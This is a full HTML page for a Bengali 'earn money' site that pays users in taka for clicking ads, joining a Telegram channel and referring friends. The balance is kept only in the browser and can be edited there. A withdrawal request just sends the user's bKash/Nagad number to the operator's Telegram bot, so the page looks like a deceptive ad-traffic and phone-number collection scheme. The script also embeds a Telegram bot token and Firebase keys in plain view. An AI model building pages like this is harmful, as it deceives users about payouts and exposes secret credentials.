<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>মিষ্টি আম - ইনকাম</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBWhYvIKGHfDO4NrH0G5N692FljzD_wmZc",
            authDomain: "misti-am.firebaseapp.com",
            projectId: "misti-am",
            databaseURL: "https://misti-am-default-rtdb.firebaseio.com",
            appId: "1:335857181187:web:ce34124f9daea3a4262436"
        };
        firebase.initializeApp(firebaseConfig);
    </script>

    <style>
        body { font-family: 'Arial', sans-serif; background: #fff5f8; text-align: center; padding: 10px; color: #333; }
        .box { background: #fff; padding: 15px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        .balance-card { background: #fff8e1; border: 2px solid orange; border-radius: 15px; padding: 15px; margin-bottom: 15px; }
        .balance { font-size: 32px; font-weight: bold; color: #d35400; }
        .ad-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .ad-btn { background: #27ae60; color: #fff; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .ad-btn:disabled { background: #bdc3c7; cursor: not-allowed; }
        .action-section { background: #f0f7ff; padding: 15px; border-radius: 15px; margin-top: 20px; border: 1px solid #2196f3; }
        .wd-btn { background: #2980b9; color: #fff; width: 100%; padding: 12px; margin-top: 10px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
        .wd-btn:disabled { background: #bdc3c7; color: #666; cursor: not-allowed; }
        .share-btn { text-decoration: none; color: #fff; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 14px; display: block; cursor: pointer; margin-top: 10px; width: 100%; border: none; }
        input, select { width: 90%; padding: 10px; margin-top: 5px; border-radius: 8px; border: 1px solid #ccc; }
    </style>
</head>
<body>

<div class="box">
    <h1>মিষ্টি আম 🥭💰</h1>
    <div class="balance-card">
        <p style="margin:0;">মোট ব্যালেন্স</p>
        <div class="balance"><span id="bl">0</span> ৳</div>
        <p style="margin:0; font-size: 12px; color: #666;">আইডি: #<span id="uid">...</span></p>
    </div>

    <strong>📺 আজকের ১০টি অ্যাড:</strong>
    <div id="adGrid" class="ad-grid"></div>

    <div class="action-section">
        <strong>📢 রেফার করলে ১০ টাকা বোনাস</strong>
        <p style="font-size: 11px; margin: 5px 0;">নিচের বাটনে ক্লিক করে বটের লিঙ্ক শেয়ার করুন!</p>
        <button onclick="shareWhatsApp()" class="share-btn" style="background: #25d366;">WhatsApp-এ শেয়ার করুন</button>
        <button onclick="shareTelegram()" class="share-btn" style="background: #0088cc;">Telegram-এ শেয়ার করুন</button>
    </div>

    <div class="action-section" id="joinSection" style="background: #fff0f0; border-color: #ff4d4d;">
        <strong>🎁 টেলিগ্রাম জয়েন করে ১০ টাকা পান</strong>
        <p style="font-size: 11px; margin: 5px 0;">চ্যানেলে জয়েন করলেই ১০ টাকা ব্যালেন্সে পাবেন!</p>
        <a href="https://t.me/mistiam5" target="_blank" class="share-btn" style="background:#0088cc;" onclick="giveJoinBonus()">টেলিগ্রাম চ্যানেলে জয়েন করুন</a>
    </div>

    <div class="action-section">
        <strong>💳 টাকা উত্তোলন (Withdraw)</strong>
        <select id="method">
            <option value="bKash">বিকাশ</option>
            <option value="Nagad">নগদ</option>
        </select>
        <input type="number" id="wdNumber" placeholder="নম্বর দিন">
        <button id="wb" class="wd-btn" onclick="processWD()" disabled>উইথড্র করুন (মিনিমাম ৫০০৳)</button>
    </div>
</div>

<script>
    const botToken = "7763993767:AAF8_u_Hq43Yc67sHk7H4mk3EkFIF8NFLFw";
    const chatID = "7621146681"; 
    const botLink = "https://t.me/mostiambot"; // আপনার বটের লিঙ্ক

    const adLinks = [
        "https://omg10.com/4/10692961", "https://omg10.com/4/10692960", "https://omg10.com/4/10692959",
        "https://omg10.com/4/10692957", "https://omg10.com/4/10692956", "https://omg10.com/4/10692955",
        "https://omg10.com/4/10692954", "https://omg10.com/4/10692953", "https://omg10.com/4/10677665",
        "https://omg10.com/4/10678359"
    ];

    let b = localStorage.getItem('b') ? parseInt(localStorage.getItem('b')) : 0;
    let myID = localStorage.getItem('myID') || Math.floor(100000 + Math.random() * 900000);
    localStorage.setItem('myID', myID);
    document.getElementById('uid').innerText = myID;

    function sendTelegramMessage(text) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatID, text: text, parse_mode: 'HTML' })
        });
    }

    // বটের লিঙ্ক রেফারেল আইডি সহ শেয়ার হবে
    function shareWhatsApp() {
        const text = `মিষ্টি আম বত-এ জয়েন করে ইনকাম করুন! আমার রেফারেল আইডি: ${myID}\nলিঙ্ক: ${botLink}`;
        window.open(`https://wa.me/?text=${encodeURIComponent(text)}`);
    }

    function shareTelegram() {
        const text = `ইনকাম শুরু করুন মিষ্টি আম বত থেকে! আইডি: ${myID}`;
        window.open(`https://t.me/share/url?url=${encodeURIComponent(botLink)}&text=${encodeURIComponent(text)}`);
    }

    function giveJoinBonus() {
        if (!localStorage.getItem('joined')) {
            b += 10;
            updateBalance();
            localStorage.setItem('joined', 'true');
            sendTelegramMessage(`🎁 ইউজার #${myID} চ্যানেলে জয়েন করে ১০৳ বোনাস নিয়েছে!`);
            alert("অভিনন্দন! ১০ টাকা যোগ হয়েছে।");
            location.reload();
        }
    }

    function updateBalance() {
        localStorage.setItem('b', b);
        document.getElementById('bl').innerText = b;
        document.getElementById('wb').disabled = (b < 500);
    }

    function processWD() {
        const method = document.getElementById('method').value;
        const num = document.getElementById('wdNumber').value;
        if(!num) { alert("নম্বর দিন!"); return; }
        const text = `💰 <b>Withdraw!</b>\nID: #${myID}\nমেথড: ${method}\nনম্বর: ${num}\nপরিমাণ: ${b}৳`;
        sendTelegramMessage(text);
        alert("টেলিগ্রামে পাঠানো হয়েছে!");
        b = 0; updateBalance(); location.reload();
    }

    function createButtons() {
        const grid = document.getElementById('adGrid');
        const today = new Date().toDateString();
        for (let i = 0; i < 10; i++) {
            const btn = document.createElement('button');
            btn.className = 'ad-btn';
            btn.innerText = `অ্যাড ${i + 1}`;
            if (localStorage.getItem(`ad_${i}`) === today) { btn.disabled = true; btn.innerText = "শেষ ✅"; }
            btn.onclick = () => {
                window.open(adLinks[i], '_blank');
                setTimeout(() => {
                    b += 5;
                    localStorage.setItem(`ad_${i}`, today);
                    updateBalance();
                    location.reload();
                }, 5000);
            };
            grid.appendChild(btn);
        }
        updateBalance();
        if(localStorage.getItem('joined')) document.getElementById('joinSection').style.display = 'none';
    }
    createButtons();
</script>
</body>
</html>
